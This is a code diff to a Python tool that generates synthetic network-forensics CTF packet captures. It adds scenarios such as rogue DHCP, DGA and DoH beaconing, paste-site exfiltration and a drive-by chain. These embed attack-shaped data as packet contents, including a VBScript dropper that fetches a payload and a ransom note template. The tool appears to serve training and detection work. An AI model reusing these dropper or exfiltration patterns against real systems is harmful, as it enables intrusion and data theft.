@@ -31,7 +31,7 @@ from scapy.all import (
 
 TOOL_NAME   = "ChumBucket"
 SUBTITLE    = "Network-Forensics CTF Challenge Forge"
-VERSION     = "v0.9-beta"
+VERSION     = "v1.0-beta"
 AUTHOR      = "Profe Malware"
 DESCRIPTION = (
     "Chums the water with realistic background traffic and decoy flags, then hides\n"
@@ -222,6 +222,13 @@ def interactive_config(args):
         ("port-scan",    "SCENARIO: SYN sweep; flag in the open port's banner"),
         ("brute-force",  "SCENARIO: failed logins then success; flag is cracked pw"),
         ("c2-beacon",    "SCENARIO: fixed-interval C2 callbacks; flag in a beacon"),
+        ("rogue-dhcp",   "SCENARIO: rogue DHCP offer; flag in the boot-file field"),
+        ("ssdp-upnp",    "SCENARIO: SSDP/UPnP abuse; flag in a NOTIFY LOCATION URL"),
+        ("doh-beacon",   "SCENARIO: DNS-over-HTTPS beacon; flag in the TLS SNI label"),
+        ("dga-beacon",   "SCENARIO: DGA domain burst; flag is one query's label"),
+        ("malware-chain","SCENARIO: redirect->dropper->payload; flag in the dropper"),
+        ("ransomware-note","SCENARIO: ransom note; flag is the 'Personal ID'"),
+        ("pastebin-exfil","SCENARIO: dead-drop paste exfil; flag split across POSTs"),
     ])
     if choice in _SCENARIOS:
         args.scenario = choice
@@ -258,6 +265,20 @@ def interactive_config(args):
     args.dhcp  = ask_int("  DHCP handshakes", 2)
     args.clients = ask_int("  How many distinct hosts/IPs to generate on the LAN", 6)
     args.decoys = ask_int("  Decoy/red-herring fake flags", 3)
+    if args.decoys > 0:
+        args.decoy_theme = ask_choice("  Red-herring flavor", [
+            ("spongebob", "Bikini Bottom mashups (default)"),
+            ("cyber",     "realistic security jargon + fake CVEs"),
+            ("mixed",     "both spongebob and cyber"),
+            ("custom",    "your own word list"),
+        ])
+        if args.decoy_theme == "custom":
+            raw = ask("  Custom words (comma-separated)", "")
+            args.decoy_words = [w.strip() for w in raw.split(",") if w.strip()]
+        else:
+            args.decoy_words = []
+    else:
+        args.decoy_theme, args.decoy_words = "spongebob", []
     args.normalize = ask_yesno("  Normalize timing (even spacing, tidy capture)?", False)
 
     # --- output ---
@@ -298,6 +319,11 @@ def dns_safe_scheme(scheme: str) -> str:
     """DNS labels are case-insensitive and limited to letters/digits/hyphen, so
     base64 (and plaintext) can't survive. Coerce to a DNS-safe encoding."""
     return scheme if scheme in ("hex", "base32") else "base32"
+
+# TO ADD AN ENCODING SCHEME, update all three in lockstep so the self-check
+# still passes:  (a) encode_payload() below,  (b) the inverse in self_check()'s
+# undo(),  (c) _decode_block() for the CyberChef recipe. Add the name to the
+# --encode choices in main() too.
 
 
 def encode_payload(raw: bytes, scheme: str, xor_key: bytes | None) -> bytes:
@@ -896,11 +922,17 @@ def conv_dhcp(net, rng, clock, cfg):
     return pkts
 
 
+# --- protocol registry -----------------------------------------------------
+# TO ADD A BACKGROUND PROTOCOL:
+#   1. write conv_<proto>(net, rng, clock, cfg) -> list[packet]  (use _emit/
+#      _eth and tcp_session for TCP-based protocols so timing/MACs stay correct)
+#   2. register it here:  "<proto>": conv_<proto>
+#   3. add a --<proto> session-count arg in main() and an ask_int in
+#      interactive_config()  (and a weight in the _PER estimate dict)
 _CONV_DISPATCH = {
     "tcp": conv_tcp_generic, "http": conv_http, "https": conv_https,
     "dns": conv_dns, "icmp": conv_icmp, "arp": conv_arp, "dhcp": conv_dhcp,
 }
-
 
 def make_noise(proto: str, count: int, cfg: NoiseConfig, rng: random.Random,
                clock: list[float], net: Network, progress=None) -> list:
@@ -1039,7 +1071,8 @@ def hide_http_stream(flag: bytes, cfg: NoiseConfig, rng: random.Random,
     return res
 
 
-# SpongeBob-flavored fake-flag fodder (on-theme for the Chum Bucket).
+# --- Decoy / red-herring word pools -------------------------------------
+# SpongeBob-flavored fodder (on-theme for the Chum Bucket).
 _SB_CHARS = ["spongebob", "patrick", "squidward", "mrkrabs", "plankton", "sandy",
              "gary", "karen", "mrspuff", "squilliam", "larry", "pearl",
              "bubblebass", "flyingdutchman", "mermaidman", "barnacleboy",
@@ -1048,34 +1081,80 @@ _SB_WORDS = ["krabbypatty", "bikinibottom", "chumbucket", "krustykrab", "jellyfi
              "secretformula", "spatula", "pineapple", "goofygoober", "tartarsauce",
              "barnacles", "fishpaste", "kelpshake", "anchorarms", "mocchocolate",
              "imready", "f1shh00ks", "musclebob", "buffpants", "rippedtrousers"]
+
+# Cyber-jargon fodder (realistic-looking security terms).
+_CY_CHARS = ["buffer_overflow", "priv_esc", "reverse_shell", "sql_injection",
+             "race_condition", "use_after_free", "heap_spray", "rop_chain",
+             "kernel_panic", "null_deref", "format_string", "stack_smash",
+             "csrf_token", "xxe_payload", "deserialize", "ssrf_probe"]
+_CY_WORDS = ["mimikatz", "cobaltstrike", "metasploit", "powershell", "rootkit",
+             "keylogger", "ransomware", "backdoor", "payload", "shellcode",
+             "exfil", "beacon", "implant", "dropper", "loader", "c2node",
+             "lateral_move", "persistence", "credential_dump", "golden_ticket"]
+# fake-CVE style decoys, generated on the fly
+_CY_CVE_YEARS = [2021, 2022, 2023, 2024, 2025]
+
 _LEET = {"a": "4", "e": "3", "i": "1", "o": "0", "s": "5", "t": "7"}
 
 
 def _leetify(s: str, rng: random.Random) -> str:
     return "".join(_LEET.get(c, c) if rng.random() < 0.35 else c for c in s)
 
+# TO ADD A DECOY THEME: add a <THEME>_CHARS/<THEME>_WORDS pool above, handle it
+# in _decoy_pools() below, and add it to the --decoy-theme choices + the
+# interactive prompt. (custom words are preserved verbatim; themed words get leet.)
 
-def random_decoy_text(rng: random.Random) -> str:
-    """A random SpongeBob-themed fake-flag inner string. Never repeats a pattern
-    predictably, so red herrings look varied."""
+def _decoy_pools(theme: str, custom_words):
+    """Return (chars, words, use_leet, allow_cve) for the chosen theme."""
+    if theme == "cyber":
+        return _CY_CHARS, _CY_WORDS, True, True
+    if theme == "mixed":
+        return _SB_CHARS + _CY_CHARS, _SB_WORDS + _CY_WORDS, True, True
+    if theme == "custom":
+        words = [w.strip() for w in (custom_words or []) if w.strip()]
+        if not words:                       # empty custom -> fall back to spongebob
+            return _SB_CHARS, _SB_WORDS, True, False
+        return words, words, False, False   # custom words preserved (no leet)
+    return _SB_CHARS, _SB_WORDS, True, False   # spongebob (default)
+
+
+def random_decoy_text(rng: random.Random, theme: str = "spongebob",
+                      custom_words=None) -> str:
+    """A random fake-flag inner string for the chosen theme. Patterns vary so
+    red herrings never look predictable. Custom words are preserved verbatim
+    (no leet substitution); small pools fall back to simpler patterns."""
+    chars, words, use_leet, allow_cve = _decoy_pools(theme, custom_words)
+    pool = list(dict.fromkeys(chars + words))   # combined, de-duped
+
+    # occasional fake-CVE decoy for cyber/mixed themes
+    if allow_cve and rng.random() < 0.2:
+        return f"CVE_{rng.choice(_CY_CVE_YEARS)}_{rng.randint(1000, 49999)}"
+
+    # small pool (e.g. 1-2 custom words) -> simple, safe patterns only
+    if len(pool) < 4:
+        base = rng.choice(pool) if pool else "decoy"
+        s = base if rng.random() < 0.4 else f"{base}_{rng.randint(10, 9999)}"
+        return _leetify(s, rng) if use_leet else s
+
     pat = rng.randint(0, 5)
     if pat == 0:
-        s = f"{rng.choice(_SB_CHARS)}_{rng.choice(_SB_WORDS)}"
+        s = f"{rng.choice(chars)}_{rng.choice(words)}"
     elif pat == 1:
-        s = f"{rng.choice(_SB_WORDS)}_{rng.randint(10, 9999)}"
+        s = f"{rng.choice(words)}_{rng.randint(10, 9999)}"
     elif pat == 2:
-        s = f"{rng.choice(_SB_CHARS)}{rng.choice(_SB_CHARS)}".replace("_", "")
+        s = f"{rng.choice(chars)}{rng.choice(chars)}".replace("_", "")
     elif pat == 3:
-        s = f"{rng.choice(_SB_CHARS)}_loves_{rng.choice(_SB_WORDS)}"
+        s = f"{rng.choice(chars)}_{rng.choice(words)}"
     elif pat == 4:
-        s = f"{rng.choice(_SB_WORDS)}_{rng.choice(_SB_CHARS)}_{rng.randint(1, 99)}"
+        s = f"{rng.choice(words)}_{rng.choice(chars)}_{rng.randint(1, 99)}"
     else:
-        s = f"not_{rng.choice(_SB_CHARS)}s_{rng.choice(_SB_WORDS)}"
-    return _leetify(s, rng)
+        s = f"not_{rng.choice(chars)}_{rng.choice(words)}"
+    return _leetify(s, rng) if use_leet else s
 
 
 def make_decoys(wrapper: str, count: int, cfg: NoiseConfig, rng: random.Random,
-                clock: list[float], net: Network) -> list:
+                clock: list[float], net: Network, theme: str = "spongebob",
+                custom_words=None) -> list:
     """Plant plausible-but-wrong flag-shaped strings as red herrings, carried in
     real-looking HTTP traffic between actual hosts. Each decoy is a unique,
     randomized SpongeBob-themed string."""
@@ -1086,7 +1165,7 @@ def make_decoys(wrapper: str, count: int, cfg: NoiseConfig, rng: random.Random,
     for _ in range(count):
         client = rng.choice(net.clients)
         server = rng.choice(list(net.servers.values()))
-        fake = f"{open_}{random_decoy_text(rng)}{close}"
+        fake = f"{open_}{random_decoy_text(rng, theme, custom_words)}{close}"
         note = rng.choice(notes)
         tail = " -->" if note.startswith("<!--") else ""
         body = (f"HTTP/1.1 200 OK\r\nServer: {rng.choice(_SERVER_BANNERS)}\r\n"
@@ -1480,8 +1559,325 @@ def scenario_c2_beacon(flag: bytes, rng, clock, cfg, scheme, xor_key,
         f"Take that data value and {describe_decode(actual, xor_key)}.",
     ]
     return res
+# ===========================================================================
+# Wave-2 scenarios
+# ===========================================================================
+def scenario_rogue_dhcp(flag, rng, clock, cfg, scheme, xor_key, net):
+    """A rogue DHCP server races the legit one: it answers a client's DISCOVER
+    with its own OFFER advertising the ATTACKER as the gateway/DNS. The encoded
+    flag rides in the rogue OFFER's BOOTP boot-file field."""
+    enc = (flag.decode() if scheme == "none"
+           else encode_payload(flag, scheme, xor_key).decode())
+    client = rng.choice(net.clients)
+    rogue = rng.choice([c for c in net.clients if c.ip != client.ip])  # attacker host
+    gw = net.gateway
+    chaddr = _mac_bytes(client.mac) + b"\x00" * 10
+    xid = rng.randint(1, 2**32 - 1)
+    res = HideResult()
+
+    def _boot(msgtype, src_ip, dst_ip, src_mac, dst_mac, yiaddr="0.0.0.0", opts=None):
+        o = [("message-type", msgtype)] + (opts or []) + ["end"]
+        return (Ether(src=src_mac, dst=dst_mac) /
+                IP(src=src_ip, dst=dst_ip) /
+                UDP(sport=67 if msgtype in ("offer", "ack") else 68,
+                    dport=68 if msgtype in ("offer", "ack") else 67) /
+                BOOTP(chaddr=chaddr, xid=xid, yiaddr=yiaddr, ciaddr="0.0.0.0") /
+                DHCP(options=o))
+
+    disc = _boot("discover", "0.0.0.0", "255.255.255.255",
+                 client.mac, "ff:ff:ff:ff:ff:ff")
+    legit = _boot("offer", gw.ip, "255.255.255.255", gw.mac, client.mac,
+                  yiaddr=client.ip,
+                  opts=[("server_id", gw.ip), ("router", gw.ip),
+                        ("lease_time", 86400), ("subnet_mask", "255.255.255.0")])
+    rogue_off = _boot("offer", rogue.ip, "255.255.255.255", rogue.mac, client.mac,
+                      yiaddr=client.ip,
+                      opts=[("server_id", rogue.ip), ("router", rogue.ip),
+                            ("name_server", rogue.ip), ("lease_time", 600),
+                            ("subnet_mask", "255.255.255.0")])
+    rogue_off[BOOTP].file = enc.encode()   # flag tucked in the boot-file field
+    for p in (disc, legit, rogue_off):
+        clock[0] += abs(rng.gauss(0.03, 0.01)) + 0.002
+        p.time = clock[0]
+        res.packets.append(p)
+    res.mark(rogue_off, "Rogue DHCP OFFER (attacker as gateway/DNS); flag in boot-file")
+    tail = "read it directly" if scheme == "none" else f"{describe_decode(scheme, xor_key)}"
+    res.solution = [
+        f"Two DHCP OFFERs answer the same DISCOVER (xid {xid:#x}): one from the real "
+        f"gateway {gw.ip}, one from {rogue.ip} - a rogue DHCP server.",
+        f"The rogue OFFER advertises {rogue.ip} as router AND DNS, and carries data "
+        f"in the BOOTP boot-file (sname/file) field.",
+        f"Take the boot-file value and {tail}.",
+    ]
+    return res
 
 
+def scenario_ssdp_upnp(flag, rng, clock, cfg, scheme, xor_key, net):
+    """SSDP/UPnP discovery abuse: an M-SEARCH to 239.255.255.250:1900 and NOTIFY
+    answers. One malicious NOTIFY's LOCATION URL carries the encoded flag in a
+    query parameter pointing at a rogue device description."""
+    enc = (encode_payload(flag, "base64", xor_key).decode() if scheme == "none"
+           else encode_payload(flag, scheme, xor_key).decode())
+    client = rng.choice(net.clients)
+    rogue = rng.choice([c for c in net.clients if c.ip != client.ip])
+    MCAST = "239.255.255.250"
+    res = HideResult()
+
+    msearch = ("M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n"
+               'MAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n').encode()
+    mp = (Ether(src=client.mac, dst="01:00:5e:7f:ff:fa") /
+          IP(src=client.ip, dst=MCAST, ttl=2) /
+          UDP(sport=rng.randint(1025, 65535), dport=1900) / Raw(load=msearch))
+    clock[0] += 0.005; mp.time = clock[0]; res.packets.append(mp)
+
+    for i in range(rng.randint(2, 4)):
+        loc = f"http://{rogue.ip}:1900/desc.xml"
+        usn = f"uuid:{rng.randint(0,2**32):08x}::upnp:rootdevice"
+        if i == 0:
+            loc = f"http://{rogue.ip}:1900/device.xml?sid={enc}"  # flag carrier
+        notify = (f"NOTIFY * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n"
+                  f"CACHE-CONTROL: max-age=1800\r\nLOCATION: {loc}\r\n"
+                  f"NT: upnp:rootdevice\r\nNTS: ssdp:alive\r\n"
+                  f"SERVER: Linux/3.14 UPnP/1.0 MiniUPnPd/2.1\r\nUSN: {usn}\r\n\r\n").encode()
+        np_ = (Ether(src=rogue.mac, dst="01:00:5e:7f:ff:fa") /
+               IP(src=rogue.ip, dst=MCAST, ttl=2) /
+               UDP(sport=1900, dport=1900) / Raw(load=notify))
+        clock[0] += abs(rng.gauss(0.04, 0.02)) + 0.003
+        np_.time = clock[0]; res.packets.append(np_)
+        if i == 0:
+            res.mark(np_, "Malicious SSDP NOTIFY; flag in the LOCATION URL 'sid' param")
+    tail = describe_decode("base64" if scheme == "none" else scheme, xor_key)
+    res.solution = [
+        f"Spot SSDP/UPnP traffic to {MCAST}:1900 - an M-SEARCH from {client.ip} and "
+        f"NOTIFY answers from {rogue.ip}.",
+        "One NOTIFY's LOCATION URL has an extra 'sid=' query parameter (a rogue device "
+        "description) - that value is the encoded flag.",
+        f"Take the sid value and {tail}.",
+    ]
+    return res
+
+
+def scenario_doh_beacon(flag, rng, clock, cfg, scheme, xor_key, net):
+    """Malware beacons over DNS-over-HTTPS to a public resolver at fixed intervals
+    (TLS/443). The bodies are encrypted, but the TLS SNI is in the clear: one
+    beacon's SNI has an extra data label that is the encoded flag."""
+    enc = encode_payload(flag, dns_safe_scheme(scheme), xor_key).decode().lower()
+    client = rng.choice(net.clients)
+    provider = Host("104.16.249.249", net.gateway.mac, "server", "cloudflare-dns.com")
+    interval = rng.choice([30.0, 60.0])
+    n = rng.randint(4, 6)
+    flag_idx = rng.randint(1, n - 1)
+    res = HideResult()
+    start = clock[0]
+    for i in range(n):
+        sni = "cloudflare-dns.com" if i != flag_idx else f"{enc}.cloudflare-dns.com"
+        ch = _tls_client_hello(sni, rng)
+        sh = _tls_record(0x16, bytes(rng.getrandbits(8) for _ in range(rng.randint(600, 1200))))
+        clock[0] = start + i * interval
+        session = tcp_session(net, client, provider, 443,
+                              [("c2s", ch), ("s2c", sh),
+                               ("c2s", _tls_record(0x17, bytes(rng.getrandbits(8) for _ in range(rng.randint(80, 200))))),
+                               ("s2c", _tls_record(0x17, bytes(rng.getrandbits(8) for _ in range(rng.randint(80, 300)))))],
+                              rng, clock, cfg)
+        res.packets += session
+        for p in session:
+            if p.haslayer(Raw) and sni.encode() in bytes(p[Raw].load):
+                res.mark(p, f"DoH beacon #{i} TLS ClientHello"
+                            + (" (SNI carries the flag label)" if i == flag_idx else " (decoy)"))
+                break
+    res.solution = [
+        f"Spot the regular TLS beaconing (443) from {client.ip} to the DoH resolver "
+        f"{provider.ip} every ~{interval:g}s - encrypted DNS-over-HTTPS.",
+        "The payloads are encrypted, but the TLS SNI (server_name) is in the clear; "
+        "one ClientHello has an extra sub-label prepended to cloudflare-dns.com.",
+        f"Take that label and {describe_decode(dns_safe_scheme(scheme), xor_key)} "
+        f"(it is stored lowercase).",
+    ]
+    return res
+
+
+def scenario_dga_beacon(flag, rng, clock, cfg, scheme, xor_key, net):
+    """Malware resolves a burst of algorithmically-generated domains (DGA) hunting
+    for its live C2. The queries look random; one query's label is the encoded
+    flag rather than DGA gibberish."""
+    enc = encode_payload(flag, dns_safe_scheme(scheme), xor_key).decode().lower()
+    client = rng.choice(net.clients)
+    tlds = [".com", ".net", ".biz", ".info", ".xyz"]
+    res = HideResult()
+    n = rng.randint(10, 16)
+    flag_idx = rng.randint(2, n - 2)
+    for i in range(n):
+        if i == flag_idx:
+            qname = f"{enc}{rng.choice(tlds)}"
+        else:
+            label = "".join(rng.choice("abcdefghijklmnopqrstuvwxyz0123456789")
+                            for _ in range(rng.randint(12, 20)))
+            qname = f"{label}{rng.choice(tlds)}"
+        q = (_eth(net, client.ip, net.dns.ip) / IP(src=client.ip, dst=net.dns.ip) /
+             UDP(sport=rng.randint(1025, 65535), dport=53) /
+             DNS(rd=1, id=rng.randint(0, 65535), qd=DNSQR(qname=qname)))
+        clock[0] += abs(rng.gauss(0.08, 0.03)) + 0.002
+        q.time = clock[0]
+        res.packets.append(q)
+        if rng.random() < 0.6:
+            r = (_eth(net, net.dns.ip, client.ip) / IP(src=net.dns.ip, dst=client.ip) /
+                 UDP(sport=53, dport=q[UDP].sport) /
+                 DNS(id=q[DNS].id, qr=1, ra=1, rcode=3, qd=DNSQR(qname=qname)))
+            clock[0] += abs(rng.gauss(0.02, 0.01)) + 0.001
+            r.time = clock[0]
+            res.packets.append(r)
+        if i == flag_idx:
+            res.mark(q, "DGA query whose label is the encoded flag (not gibberish)")
+    res.solution = [
+        f"Spot the DGA beaconing: {client.ip} fires {n} DNS lookups to long random "
+        f"domains across many TLDs, mostly NXDOMAIN - classic domain-generation.",
+        "One query's label isn't random gibberish; it is the encoded flag.",
+        f"Take that label and {describe_decode(dns_safe_scheme(scheme), xor_key)} "
+        f"(stored lowercase).",
+    ]
+    return res
+
+
+def scenario_malware_chain(flag, rng, clock, cfg, scheme, xor_key, net):
+    """A drive-by chain: a lure URL 302-redirects through a couple of hops to a
+    dropper script, which then pulls a binary payload. The dropper script embeds
+    the encoded flag as its C2 key (readable in the HTTP stream)."""
+    enc = (encode_payload(flag, "base64", xor_key).decode() if scheme == "none"
+           else encode_payload(flag, scheme, xor_key).decode())
+    client = rng.choice(net.clients)
+    servers = list(net.servers.values())
+    lure, hop, drop = (rng.choice(servers) for _ in range(3))
+    ua = rng.choice(_USER_AGENTS)
+    res = HideResult()
+
+    req1 = (f"GET /invoice/INV-4471.doc HTTP/1.1\r\nHost: {lure.name}\r\n"
+            f"User-Agent: {ua}\r\nAccept: */*\r\n\r\n").encode()
+    resp1 = _http_response(rng, lure.name, status=302,
+                           location=f"http://{hop.name}/cdn/redir?u=8821", body=b"")
+    res.packets += tcp_session(net, client, lure, 80, [("c2s", req1), ("s2c", resp1)], rng, clock, cfg)
+    req2 = (f"GET /cdn/redir?u=8821 HTTP/1.1\r\nHost: {hop.name}\r\n"
+            f"User-Agent: {ua}\r\nAccept: */*\r\n\r\n").encode()
+    resp2 = _http_response(rng, hop.name, status=302,
+                           location=f"http://{drop.name}/get/update.hta", body=b"")
+    res.packets += tcp_session(net, client, hop, 80, [("c2s", req2), ("s2c", resp2)], rng, clock, cfg)
+    dropper = (f"<html><head><script language=\"VBScript\">\n"
+               f"' auto-update component\nDim c2key, payloadUrl\n"
+               f"c2key = \"{enc}\"\n"
+               f"payloadUrl = \"http://{drop.name}/bin/update.bin\"\n"
+               f"Set x = CreateObject(\"MSXML2.XMLHTTP\")\n"
+               f"x.open \"GET\", payloadUrl, False\nx.send\n"
+               f"</script></head><body>Updating...</body></html>").encode()
+    req3 = (f"GET /get/update.hta HTTP/1.1\r\nHost: {drop.name}\r\n"
+            f"User-Agent: {ua}\r\nAccept: */*\r\n\r\n").encode()
+    resp3 = _http_response(rng, drop.name, path="/get/update.hta",
+                           ctype="application/hta", body=dropper, set_cookie=False, gzip_ok=False)
+    sess3 = tcp_session(net, client, drop, 80, [("c2s", req3), ("s2c", resp3)], rng, clock, cfg)
+    res.packets += sess3
+    for p in sess3:
+        if p.haslayer(Raw) and b"c2key" in bytes(p[Raw].load):
+            res.mark(p, "Dropper script (.hta) embedding the flag as its c2key")
+            break
+    payload = b"MZ" + bytes(rng.getrandbits(8) for _ in range(rng.randint(400, 900)))
+    req4 = (f"GET /bin/update.bin HTTP/1.1\r\nHost: {drop.name}\r\n"
+            f"User-Agent: {ua}\r\nAccept: */*\r\n\r\n").encode()
+    resp4 = _http_response(rng, drop.name, path="/bin/update.bin",
+                           ctype="application/octet-stream", body=payload, set_cookie=False)
+    res.packets += tcp_session(net, client, drop, 80, [("c2s", req4), ("s2c", resp4)], rng, clock, cfg)
+    tail = describe_decode("base64" if scheme == "none" else scheme, xor_key)
+    res.solution = [
+        f"Follow the redirect chain from {client.ip}: a lure on {lure.name} 302s to "
+        f"{hop.name}, which 302s to {drop.name} serving an .hta dropper, which pulls "
+        f"an MZ binary (/bin/update.bin).",
+        "Open the dropper (.hta) stream; it sets c2key = \"<encoded flag>\".",
+        f"Take the c2key value and {tail}.",
+    ]
+    return res
+
+
+def scenario_ransomware_note(flag, rng, clock, cfg, scheme, xor_key, net):
+    """Post-encryption, the host fetches/drops a ransom note. The note text is in
+    the clear and contains a 'Personal ID' that is the encoded flag."""
+    enc = (encode_payload(flag, "base64", xor_key).decode() if scheme == "none"
+           else encode_payload(flag, scheme, xor_key).decode())
+    client = rng.choice(net.clients)
+    server = rng.choice([s for s in net.servers.values()])
+    ua = rng.choice(_USER_AGENTS)
+    res = HideResult()
+    note = (b"!!! YOUR FILES HAVE BEEN ENCRYPTED !!!\r\n\r\n"
+            b"All your documents, photos and databases were encrypted with AES-256.\r\n"
+            b"To recover them you must purchase the decryptor in Bitcoin.\r\n\r\n"
+            b"Personal ID: " + enc.encode() + b"\r\n"
+            b"Contact: recovery_help@protonmail.com within 72 hours.\r\n"
+            b"Tor portal: http://decrypt" + ("%08x" % rng.getrandbits(32)).encode()
+            + b".onion/\r\n")
+    req = (f"GET /READ_ME_DECRYPT.txt HTTP/1.1\r\nHost: {server.name}\r\n"
+           f"User-Agent: {ua}\r\nAccept: */*\r\n\r\n").encode()
+    resp = _http_response(rng, server.name, path="/READ_ME_DECRYPT.txt",
+                          ctype="text/plain", body=note, set_cookie=False, gzip_ok=False)
+    sess = tcp_session(net, client, server, 80, [("c2s", req), ("s2c", resp)], rng, clock, cfg)
+    res.packets += sess
+    for p in sess:
+        if p.haslayer(Raw) and b"Personal ID:" in bytes(p[Raw].load):
+            res.mark(p, "Ransom note (READ_ME_DECRYPT.txt); flag is the 'Personal ID'")
+            break
+    tail = describe_decode("base64" if scheme == "none" else scheme, xor_key)
+    res.solution = [
+        f"Spot the ransom note fetched by {client.ip} (READ_ME_DECRYPT.txt) - text "
+        f"mentioning AES-256, Bitcoin, and a .onion portal.",
+        "The note's 'Personal ID:' field is the encoded flag.",
+        f"Take the Personal ID and {tail}.",
+    ]
+    return res
+
+def scenario_pastebin_exfil(flag, rng, clock, cfg, scheme, xor_key, net):
+    """Data is exfiltrated to a paste service across several POSTs - a 'dead drop'.
+    The encoded flag is split into indexed chunks; reassemble them in order."""
+    enc = (encode_payload(flag, "base64", xor_key) if scheme == "none"
+           else encode_payload(flag, scheme, xor_key))
+    client = rng.choice(net.clients)
+    paste = Host("104.20.3.235", net.gateway.mac, "server", "pastebin.com")
+    ua = rng.choice(_USER_AGENTS)
+    res = HideResult()
+    nchunks = rng.randint(3, 5)
+    size = (len(enc) + nchunks - 1) // nchunks
+    chunks = [enc[i:i + size] for i in range(0, len(enc), size)]
+    for idx, ch in enumerate(chunks):
+        body = (f"api_dev_key=8f3c2&api_option=paste&paste_private=1&"
+                f"paste_idx={idx}&paste_data={ch.decode()}").encode()
+        req = (f"POST /api/api_post.php HTTP/1.1\r\nHost: {paste.name}\r\n"
+               f"User-Agent: {ua}\r\nContent-Type: application/x-www-form-urlencoded\r\n"
+               f"Content-Length: {len(body)}\r\n\r\n").encode() + body
+        resp = _http_response(rng, paste.name, path="/api/api_post.php",
+                              ctype="text/plain",
+                              body=f"https://pastebin.com/{rng.getrandbits(32):08x}".encode(),
+                              set_cookie=False, gzip_ok=False)
+        sess = tcp_session(net, client, paste, 80, [("c2s", req), ("s2c", resp)], rng, clock, cfg)
+        res.packets += sess
+        for p in sess:
+            if p.haslayer(Raw) and b"paste_data=" in bytes(p[Raw].load):
+                res.mark(p, f"Paste dead-drop POST chunk #{idx}")
+                break
+        clock[0] += abs(rng.gauss(0.3, 0.1)) + 0.05
+    tail = describe_decode("base64" if scheme == "none" else scheme, xor_key)
+    res.solution = [
+        f"Spot the dead-drop exfil: {client.ip} makes {len(chunks)} POSTs to the paste "
+        f"service {paste.name} ({paste.ip}).",
+        "Each POST body has paste_idx=N and paste_data=<chunk>; sort by idx and "
+        "concatenate the chunks.",
+        f"Then {tail} to recover the flag.",
+    ]
+    return res
+
+# --- scenario registry -----------------------------------------------------
+# TO ADD AN ATTACK SCENARIO:
+#   1. write scenario_<name>(flag, rng, clock, cfg, scheme, xor_key, net)
+#      -> HideResult   (build the attack traffic; res.mark() the carrier
+#      packet(s); fill res.solution with the human solve path)
+#   2. register it here:  "<name>": scenario_<name>
+#   3. add a self_check branch for "<name>" so generation is verified
+#   4. add "<name>" to the --scenario choices in main() AND to the
+#      interactive Step-2 menu in interactive_config()
+# These are DETECTION FIXTURES: any crypto/credential material is synthetic.
 _SCENARIOS = {
     "kerberoast": scenario_kerberoast,
     "ftp-creds": scenario_ftp_creds,
@@ -1491,6 +1887,13 @@ _SCENARIOS = {
     "port-scan": scenario_port_scan,
     "brute-force": scenario_brute_force,
     "c2-beacon": scenario_c2_beacon,
+    "rogue-dhcp": scenario_rogue_dhcp,
+    "ssdp-upnp": scenario_ssdp_upnp,
+    "doh-beacon": scenario_doh_beacon,
+    "dga-beacon": scenario_dga_beacon,
+    "malware-chain": scenario_malware_chain,
+    "ransomware-note": scenario_ransomware_note,
+    "pastebin-exfil": scenario_pastebin_exfil,
 }
 
 
@@ -1520,7 +1923,9 @@ def build_challenge(args, progress=None) -> tuple[list, list[str], "Network"]:
 
     # decoys
     if args.decoys > 0:
-        all_pkts += make_decoys(args.wrapper, args.decoys, cfg, rng, clock, net)
+        all_pkts += make_decoys(args.wrapper, args.decoys, cfg, rng, clock, net,
+                                        getattr(args, "decoy_theme", "spongebob"),
+                                        getattr(args, "decoy_words", None))
 
     # hidden flag: a scenario takes precedence over a plain hide method
     if args.scenario != "none":
@@ -1630,9 +2035,10 @@ def self_check(pkts, args) -> bool:
 
     def eff_scheme():
         chal = args.scenario if args.scenario != "none" else args.method
-        if chal in ("kerberoast", "dns"):
+        if chal in ("kerberoast", "dns", "doh-beacon", "dga-beacon"):
             return dns_safe_scheme(args.encode)
-        if chal in ("arp-spoof", "c2-beacon"):
+        if chal in ("arp-spoof", "c2-beacon", "ssdp-upnp", "malware-chain",
+                    "ransomware-note", "pastebin-exfil"):
             return args.encode if args.encode != "none" else "base64"
         if chal == "http" and args.encode == "none":
             return "base64"
@@ -1718,7 +2124,62 @@ def self_check(pkts, args) -> bool:
                     if undo(m.group(1)) == target:
                         return True
         return False
-
+    if args.scenario == "rogue-dhcp":
+        for p in pkts:
+            if p.haslayer(BOOTP):
+                f = bytes(p[BOOTP].file).rstrip(b"\x00")
+                if f and hit(f):
+                    return True
+        return False
+    if args.scenario == "ssdp-upnp":
+        for p in pkts:
+            if p.haslayer(_Raw):
+                m = _re.search(rb"sid=([A-Za-z0-9+/=]+)", bytes(p[_Raw].load))
+                if m and hit(m.group(1)):
+                    return True
+        return False
+    if args.scenario in ("doh-beacon", "dga-beacon"):
+        for p in pkts:
+            if args.scenario == "dga-beacon" and p.haslayer(_DNSQR):
+                lbl = p[_DNSQR].qname.decode().rstrip(".").split(".")[0].encode()
+                if undo(lbl) == target:
+                    return True
+            if args.scenario == "doh-beacon" and p.haslayer(_Raw):
+                m = _re.search(rb"([a-z0-9]+)\.cloudflare-dns\.com", bytes(p[_Raw].load))
+                if m:
+                    g = m.group(1)
+                    for k in range(0, 4):   # trim TLS length byte that may bleed in
+                        if undo(g[k:]) == target:
+                            return True
+        return False
+    if args.scenario == "malware-chain":
+        for p in pkts:
+            if p.haslayer(_Raw):
+                m = _re.search(rb'c2key\s*=\s*"([^"]+)"', bytes(p[_Raw].load))
+                if m and hit(m.group(1)):
+                    return True
+        return False
+    if args.scenario == "ransomware-note":
+        for p in pkts:
+            if p.haslayer(_Raw):
+                m = _re.search(rb"Personal ID:\s*([A-Za-z0-9+/=]+)", bytes(p[_Raw].load))
+                if m and hit(m.group(1)):
+                    return True
+        return False
+    if args.scenario == "pastebin-exfil":
+        chunks = {}
+        for p in pkts:
+            if p.haslayer(_Raw):
+                load = bytes(p[_Raw].load)
+                mi = _re.search(rb"paste_idx=(\d+)", load)
+                md = _re.search(rb"paste_data=([A-Za-z0-9+/=]+)", load)
+                if mi and md:
+                    chunks[int(mi.group(1))] = md.group(1)
+        if chunks:
+            enc = b"".join(chunks[k] for k in sorted(chunks))
+            return undo(enc) == target
+        return False
+    
     if args.method == "dns":
         labels = {}
         for p in pkts:
@@ -1764,7 +2225,9 @@ def main():
     ap.add_argument("--scenario", default="none",
                     choices=["none", "kerberoast", "ftp-creds", "telnet-creds",
